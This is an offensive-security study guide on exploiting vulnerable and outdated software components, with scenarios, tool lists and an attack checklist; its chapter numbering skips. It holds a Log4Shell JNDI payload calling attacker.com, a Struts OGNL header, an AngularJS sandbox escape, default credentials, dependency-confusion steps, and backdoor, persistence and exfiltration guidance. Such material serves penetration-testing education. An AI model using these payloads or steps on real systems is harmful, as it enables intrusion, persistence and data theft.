## 🔥 Chapter 1: Vulnerable and Outdated Components – Deep Dive

---

### 🚨 What are Vulnerable and Outdated Components?

This vulnerability occurs when applications **use components (libraries, frameworks, or platforms)** with **known security flaws**, and these flaws are left **unpatched or ignored**.

🔎 **Example:** A web app still using **Log4j v2.14.1**, which is vulnerable to **Log4Shell (CVE-2021-44228)** — an RCE bug that allows attackers to execute arbitrary code remotely.

These components may be:

* Web servers (e.g., Apache, Nginx)
* Frameworks (e.g., Spring, Django, Laravel)
* Frontend libraries (e.g., jQuery)
* Dependencies pulled via package managers (npm, pip, Maven, etc.)

---

### 🧠 Why Is It Critical?

* OWASP Top 10 #6 (2021): **Vulnerable and Outdated Components**
* Leads to **Remote Code Execution, data leaks, privilege escalation**, and full system compromise.
* Exploitable even if the application logic is secure.
* **Silent killers**: They often sit unnoticed in backend dependencies, waiting for exploit kits.

---

### 💀 Realistic Offensive Scenarios:

#### ☠️ Scenario 1: Outdated Apache Struts

An attacker finds the application running an **Apache Struts** version vulnerable to **CVE-2017-5638**. They exploit it using a crafted Content-Type header to trigger OGNL injection and gain **remote shell access**.

#### ☠️ Scenario 2: Log4j (Log4Shell)

A bug bounty hunter sends a request like:

```http
User-Agent: ${jndi:ldap://attacker.com/a}
```

On vulnerable servers, Log4j resolves this, connects to the attacker’s server, and **executes a malicious payload**, giving **reverse shell** access.

#### ☠️ Scenario 3: jQuery File Upload Arbitrary File Upload

The web app uses an old jQuery file upload plugin. The attacker uploads a PHP web shell (`shell.php`) and executes it from the browser:

```
https://victim.com/uploads/shell.php
```

Boom! Instant RCE.

---

### 🔍 Offensive Enumeration Tactics:

#### 1. **Fingerprint Technologies**

* Use tools like `Wappalyzer`, `BuiltWith`, `whatweb`, `nmap -sV`
* Look for:

  * Frameworks (e.g., `X-Powered-By: Express`)
  * JS Libraries (check browser dev tools → Sources)

#### 2. **Find Version Info**

* Headers, `/version`, `/readme.txt`, source comments
* Look for package.json, composer.lock, pom.xml exposed

#### 3. **Compare with CVE Databases**

#### 4. **Try Known Exploits**

* Always match version with an exploit database like Exploit-DB
* GitHub PoCs
* Shodan and Censys search to hunt vulnerable versions

---

### 🧪 Offensive Mindset

> "You don’t attack the app. You attack what the app is built with."

* 🧨 Forget fancy XSS payloads — if the backend runs **an old Log4j**, go for **RCE directly**.
* 🦠 Scan the application structure, understand its dependencies, then pivot to supply chain-style attacks.

---

## 🔥 Chapter 2: Types of Vulnerable Components (Offensive Deep Dive)

---

## **Chapter 5: Exploitation Vectors – Vulnerable & Outdated Components**

🔓 **Objective**: Learn how attackers **exploit outdated libraries, plugins, platforms, and frameworks** to gain initial access, elevate privileges, or exfiltrate data.

---

### 💣 1. **Remote Code Execution (RCE) via Known CVEs**

Outdated components often have **public exploits** available in databases like **Exploit-DB**, **Rapid7**, or **Metasploit**.

📌 **Example**:
Apache Struts 2 (CVE-2017-5638)
Payload:

```
Content-Type: %{(#_='multipart/form-data')....}
```

➡ Leads to **command injection** and **RCE**.

🛠️ Tools:

* Metasploit: `exploit/multi/http/struts2_content_type_ognl`
* `curl` with malicious header injection

---

### 🏹 2. **Deserialization Attacks**

Older versions of Java or .NET apps often lack secure deserialization checks.

📌 **Example**:
Apache Commons Collections – widely used in legacy apps
Attackers send **crafted serialized objects** leading to **RCE**.

🛠️ Tools:

* `ysoserial`
* `gadgetinspector`

---

### 🕳️ 3. **Unpatched Web Servers / CMS Platforms**

Legacy WordPress, Joomla, Magento, and Drupal versions have **pre-auth RCE, SQLi, or admin bypass vulnerabilities**.

📌 **Real Exploit**:
Drupalgeddon 2 (CVE-2018-7600) – allows RCE by injecting code via form fields.

🛠️ Tools:

* `wpscan`, `droopescan`, `nuclei`
* Public POCs on GitHub

---

### 🦠 4. **Poisoned Dependency Trees (Supply Chain)**

Attackers insert backdoors into outdated libraries via:

* Typosquatting (`requests3` instead of `requests`)
* Dependency confusion (internal vs public mismatches)

📌 **Example**:
npm package `event-stream` included a **malicious dependency** targeting Bitcoin wallets.

🛠️ Tools:

* `npm audit`, `yarn audit`
* `pip-audit`, `syft`, `trivy`

---

### 🧬 5. **Leaked Components in `.git`, `.svn`, or Backups**

Old plugins or libraries often get **left behind** in backup directories or version control folders.

📌 **Attack Method**:

* Fuzz for: `/.git/config`, `/backup.zip`, `/old.zip`, `/test.php.bak`
* Reverse engineer outdated libraries from backup and exploit

🛠️ Tools:

* `ffuf`, `dirsearch`
* `git-dumper`, `SVNDigger`

---

### 🔥 6. **Client-Side Exploits from Outdated JS Libraries**

Old jQuery or AngularJS versions are vulnerable to:

* DOM-based XSS
* Template injection
* Prototype pollution

📌 **Example**:
AngularJS sandbox escape in v1.4.0-1.6.5

```html
{{constructor.constructor('alert(1)')()}}
```

🛠️ Tools:

* `retire.js`
* `npm audit`
* Burp + DOM Invader

---

### 🚪 7. **Default Credentials in Legacy Software**

Old devices/software often use:

* `admin:admin`
* `root:toor`

📌 **Example**:
Old routers (D-Link, Netgear), Jenkins pre-setup consoles, phpMyAdmin, etc.

🛠️ Tools:

* `hydra`, `ncrack`, `medusa`
* `whatweb`, `nmap -sV --script vuln`

---

### 🧨 8. **Exposed Admin Panels with Old Versions**

Old exposed dashboards (Elasticsearch, Kibana, Jenkins, Tomcat) often lack:

* Auth
* Rate limiting
* Patch-level security

📌 **Real-World**:
Exposed Kibana (pre-auth RCE) or Jenkins scripting consoles.

🛠️ Tools:

* `shodan`, `zoomeye`, `fofa`
* `nmap`, `searchsploit`, `metasploit`

---

### 🔐 Exploitation Chain Example

1. Identify an outdated Apache Tomcat version with exposed `/manager/html`.
2. Use default credentials `tomcat:tomcat`.
3. Deploy malicious WAR via the admin interface.
4. Gain reverse shell.
5. Privilege escalate using a known local kernel exploit (e.g., Dirty Cow if kernel is outdated).

---

### 🧠 Key Attacker Mindset:

* **Think Like a Red Teamer**: Find version leaks (`/readme`, headers, comments).
* **Match with Public Exploits**: Use search engines + CVE DB.
* **Target Weak Links**: Focus on forgotten libraries, outdated WordPress plugins, test subdomains, and backup folders.

---

# 🔧 Chapter 7: Tools – Deep Dive (Offensive)

**Target: Vulnerable & Outdated Components**
Focus: Offensive toolkits used by penetration testers and threat actors to detect, fingerprint, and exploit outdated software, libraries, and dependencies.

---

### 🎯 Objective

To identify outdated or vulnerable components (frameworks, libraries, plugins, services) in a web or network environment and pivot toward successful exploitation.

---

## 🔍 1. **Nuclei** – Lightweight, Fast & Customizable Scanner

* **Why**: Uses YAML-based templates to detect CVEs, outdated frameworks, and known misconfigs.
* **Use case**: Scanning for outdated Apache, Tomcat, WordPress plugins, etc.
* **Example**:

```bash
nuclei -u https://target.com -t cves/
nuclei -l urls.txt -t technologies/ -severity high
```

✅ Can detect vulnerable JS libraries, known admin panels, and exposed dashboards.

---

## 📦 2. **Trivy** (for containers and apps)

* **Why**: Scans container images, file systems, and git repositories for known vulnerabilities.
* **Use case**: Audit Docker images used in production.
* **Example**:

```bash
trivy image nginx:latest
trivy fs ./webapp
```

✅ Finds outdated dependencies in Node.js, Python, Go, etc.

---

## 🌍 3. **WhatWeb / Wappalyzer CLI / BuiltWith**

* **Why**: Fingerprint technologies and versions used by a website (frameworks, CMS, servers).
* **Use case**: Detect jQuery 1.x, PHP 5.4, old Apache/Nginx servers.
* **Example**:

```bash
whatweb -v https://target.com
```

✅ Helps you decide which known CVEs to look up.

---

## 💣 4. **Shodan + Exploit-DB + NVD API Combo**

* **Why**: Find targets running vulnerable versions across the internet.
* **Use case**: Search all devices running Jenkins v2.204.1
* **Example**:
  `shodan search 'product:jenkins version:2.204.1'`

✅ Combine with Exploit-DB to find matching public exploits.

---

## 🧱 5. **Retire.js** – JavaScript Library Scanner

* **Why**: Scans JS libraries on websites for known CVEs (e.g., Angular, jQuery, Bootstrap).
* **Use case**: Client-side vulnerabilities due to old JavaScript libs.
* **Example**:

```bash
retire --outputpath . --outputformat json
```

✅ Detects jQuery 1.12.4 – vulnerable to XSS and prototype pollution.

---

## 🐍 6. **Safety / Bandit (Python)**

* **Why**: Audit Python apps for outdated/vulnerable packages and insecure code patterns.
* **Use case**: Testing Flask, Django, or FastAPI projects.
* **Example**:

```bash
safety check --full-report
bandit -r ./project/
```

✅ Reveals CVEs in libraries like `urllib3`, `Flask`, `requests`.

---

## 🔥 7. **OSV-Scanner**

* **Why**: Detects known vulnerabilities in open-source dependencies via the Open Source Vulnerability (OSV) DB.
* **Use case**: Run against lockfiles (package-lock.json, go.sum, etc.)
* **Example**:

```bash
osv-scanner -r .
```

✅ Excellent for identifying vulnerabilities in supply chain dependencies.

---

## 📚 8. **Vulmap** – Local & Remote Linux/Windows Vuln Scanner

* **Why**: Checks system-level software (PHP, MySQL, Apache, kernel) for vulnerabilities.
* **Example**:

```bash
python3 vulmap-linux.py -t 192.168.1.10 -p 22
```

✅ Great for internal pentests when you get SSH access.

---

## 🌐 9. **Nikto / Dirsearch**

* **Why**: Detects outdated server components, plugins, and exposed sensitive files.
* **Example**:

```bash
nikto -h http://target.com
dirsearch -u https://target.com -e php,html
```

✅ Nikto is noisy but useful for legacy tech stacks.

---

## 🛠️ 10. **Custom Bash / Python CVE Exploit Scripts**

* **Use**: Based on CVE ID found during recon.
* **Example**:

  * Apache Struts CVE-2017-5638
  * Log4Shell CVE-2021-44228

✅ Combine with searchsploit:

```bash
searchsploit log4j
```

---

## 🧠 Pro Tip for Red Teamers

* **Always correlate version fingerprinting results** with public CVE databases (like NVD or Exploit-DB).
* **Craft custom exploit chains** by combining:

  * Outdated CMS → Plugin vuln → File upload → RCE.

# 🧨 Chapter 8: Offensive Security Checklist for Vulnerable & Outdated Components – Deep Dive

---

## 🔍 1. 🔎 Recon & Fingerprinting

✅ **Identify Technology Stack**

* Use tools like [Wappalyzer](https://www.wappalyzer.com/), BuiltWith, and `whatweb` to enumerate web technologies.
* Look for server headers, CMS types, JS libraries, web servers, etc.

✅ **Detect Frameworks & Libraries**

* Check HTML source, JS files, package files (`package.json`, `composer.lock`, `Gemfile.lock`, etc.)
* Inspect CDN URLs: `jquery-1.8.3.min.js` → Vulnerable version clue.

✅ **Scan for Metadata Leaks**

* `.git`, `.svn`, `.DS_Store`, `.env`, backup files (`index.bak`, `config.old`).
* Use tools like `git-dumper`, `waybackurls`, `gau`, `dirsearch`.

---

## ⚙️ 2. 📦 Package Version Enumeration

✅ **Enumerate Software Versions**

* Use `nmap`, `nikto`, `whatweb`, `httprint`, `nuclei`, `httpx` for passive and active scanning.
* Use Shodan/Censys for live banners of outdated services.

✅ **Look for CVE Mapping**

* Map identified software versions to known CVEs using:

  * NVD NIST CVE search
  * `searchsploit`
  * `cve.circl.lu`
  * `exploit-db`

✅ **Compare with Latest**

* Confirm if the identified version is outdated by checking:

  * Official vendor changelogs
  * GitHub release pages
  * Package managers (pip, npm, etc.)

---

## 💣 3. 💀 Exploitation Workflow

✅ **Known CVE Exploits**

* Use `searchsploit`, `exploitdb`, or `Metasploit` to attempt real-world exploitations.
* Example: Outdated Log4j → Remote Code Execution (RCE).

✅ **Reverse Engineering Components**

* If closed-source, analyze JS, JARs, SWFs, or DLLs for possible flaws.
* Use tools like `jadx`, `ghidra`, `retdec`.

✅ **Try Dependency Confusion**

* Identify package manager use (npm, pip).
* Register malicious version of internal package names in public repo.
* Example: Internal lib `@company-lib/core` published as malicious `@company-lib/core`.

✅ **Abuse Misconfigurations**

* Old versions often have hardcoded credentials, default creds, unpatched APIs.
* Try:

  * `/admin` panels with default creds
  * `/debug`, `/phpinfo`, `/setup.php`
  * Unsecured MongoDB/Redis instances

---

## 🧬 4. 🧪 Component Fuzzing

✅ **Fuzz for Hidden Endpoints**

* Use `ffuf`, `dirsearch`, `feroxbuster`, `gobuster` to find:

  * Backup files
  * Old admin panels
  * Deprecated APIs

✅ **Fuzz Headers & Inputs**

* Try breaking outdated WAFs or older libraries.
* Look for parameter pollution, header smuggling.

✅ **Bypass Logic**

* Outdated libraries might mishandle:

  * Null bytes
  * Unicode encoding
  * Path traversal

---

## 🧨 5. 🐚 Post Exploitation Opportunities

✅ **Gain Shell / RCE**

* RCE from CVE or debug mode → reverse shell
* Install backdoor or persistence via cron jobs or web shells.

✅ **Lateral Movement**

* Use exposed configs (e.g., database creds) to pivot internally.
* Try stolen tokens on dev/test/staging/prod systems.

✅ **Privilege Escalation**

* Old versions often run with high privileges (e.g., Tomcat, Jenkins).
* Use privilege escalation scripts like:

  * `linpeas`, `winPEAS`, `linux-smart-enumeration`

✅ **Exfiltrate Sensitive Data**

* Use `find`, `grep`, or custom tools to locate:

  * API keys
  * `.env`, `config.php`, `wp-config.php`
  * Token dumps, log files, session cookies
